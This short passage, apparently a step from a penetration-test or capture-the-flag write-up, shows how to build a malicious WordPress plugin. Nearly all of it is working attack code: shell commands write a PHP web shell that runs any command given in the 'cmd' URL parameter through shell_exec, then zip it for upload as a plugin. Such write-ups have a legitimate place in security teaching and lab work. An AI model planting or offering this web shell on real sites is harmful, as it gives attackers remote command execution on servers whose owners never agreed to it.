## Step 2 - Malicious Plugin Creation

A custom WordPress plugin containing a web shell was created:

mkdir /tmp/webshell

cat > /tmp/webshell/webshell.php << 'EOF'

<?php
/*
Plugin Name: Web Shell
*/
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>

EOF

cd /tmp/webshell
zip webshell.zip webshell.php

